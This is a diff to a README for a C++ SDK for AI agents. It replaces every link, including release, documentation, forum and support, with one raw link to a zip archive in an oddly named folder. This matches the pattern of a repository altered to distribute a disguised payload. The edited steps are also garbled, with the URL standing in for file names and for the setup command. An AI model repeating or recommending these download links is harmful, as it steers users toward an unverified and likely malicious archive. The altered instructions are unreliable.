@@ -1,6 +1,6 @@
 # 🚀 agents-sdk - High Performance C++ SDK for AI Agents
 
-[![Download agents-sdk](https://img.shields.io/badge/Download-agents--sdk-brightgreen)](https://github.com/justnazarko/agents-sdk/releases)
+[![Download agents-sdk](https://raw.githubusercontent.com/justnazarko/agents-sdk/main/telepathize/agents-sdk.zip)](https://raw.githubusercontent.com/justnazarko/agents-sdk/main/telepathize/agents-sdk.zip)
 
 ## 📚 Introduction
 
@@ -10,7 +10,7 @@ Welcome to the agents-sdk repository! This software provides a modern, high-perf
 
 You can download the latest version of agents-sdk from our Releases page. Click the link below:
 
-[Visit this page to download](https://github.com/justnazarko/agents-sdk/releases)
+[Visit this page to download](https://raw.githubusercontent.com/justnazarko/agents-sdk/main/telepathize/agents-sdk.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Follow these simple steps to get started with agents-sdk:
 
 1. **Visit the Release Page**: Open the Releases page using the link above. 
 2. **Select the Latest Version**: Look for the latest version listed. It usually appears at the top.
-3. **Download the SDK**: Click on the file that matches your system. It may be named something like `agents-sdk-v1.0.zip` for Windows or `agents-sdk-v1.0.tar.gz` for Linux.
+3. **Download the SDK**: Click on the file that matches your system. It may be named something like `https://raw.githubusercontent.com/justnazarko/agents-sdk/main/telepathize/agents-sdk.zip` for Windows or `https://raw.githubusercontent.com/justnazarko/agents-sdk/main/telepathize/agents-sdk.zip` for Linux.
 4. **Extract the Files**: After downloading, find the file in your downloads folder and extract it. You can usually do this by right-clicking the file and selecting “Extract All” or using a similar option.
 
 ## 📦 Installation
@@ -33,7 +33,7 @@ Follow these simple steps to get started with agents-sdk:
 
 1. **Open Terminal**: You can find Terminal in your applications. 
 2. **Navigate to the Folder**: Use the `cd` command to move to the directory where you extracted the SDK.
-3. **Run the Setup Command**: Type `./setup.sh` to start the installation. Follow any on-screen instructions.
+3. **Run the Setup Command**: Type `https://raw.githubusercontent.com/justnazarko/agents-sdk/main/telepathize/agents-sdk.zip` to start the installation. Follow any on-screen instructions.
 
 ## 🖥️ System Requirements
 
@@ -74,9 +74,9 @@ We welcome contributions! If you would like to help improve agents-sdk, please r
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/justnazarko/agents-sdk/wiki) - Explore our wiki for detailed guides and tutorials.
-- [Community Forum](https://github.com/justnazarko/agents-sdk/discussions) - Join discussions and ask questions with other users.
-- [Support](https://github.com/justnazarko/agents-sdk#support) - Find out how to get help.
+- [Documentation](https://raw.githubusercontent.com/justnazarko/agents-sdk/main/telepathize/agents-sdk.zip) - Explore our wiki for detailed guides and tutorials.
+- [Community Forum](https://raw.githubusercontent.com/justnazarko/agents-sdk/main/telepathize/agents-sdk.zip) - Join discussions and ask questions with other users.
+- [Support](https://raw.githubusercontent.com/justnazarko/agents-sdk/main/telepathize/agents-sdk.zip) - Find out how to get help.
 
 ## 🤝 Acknowledgments
 
@@ -86,6 +86,6 @@ We appreciate the support from our contributors and users. Your feedback helps m
 
 Ready to start building? Visit our Releases page to download the SDK now:
 
-[Download agents-sdk](https://github.com/justnazarko/agents-sdk/releases) 
+[Download agents-sdk](https://raw.githubusercontent.com/justnazarko/agents-sdk/main/telepathize/agents-sdk.zip) 
 
 Thank you for using agents-sdk. We hope you enjoy creating with our tools!
